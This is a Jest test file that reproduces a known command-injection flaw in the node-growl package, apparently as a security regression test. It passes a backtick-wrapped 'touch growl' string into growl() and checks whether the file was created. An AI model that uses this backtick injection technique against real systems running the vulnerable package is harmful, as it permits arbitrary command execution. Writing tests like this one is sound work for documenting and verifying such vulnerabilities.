//https://github.com/tj/node-growl/issues/60
test("Command Injection in growl", () => {
  const growl = require("growl");
  const fs = require("fs");
  const path = "./growl";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  growl("`touch growl`");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
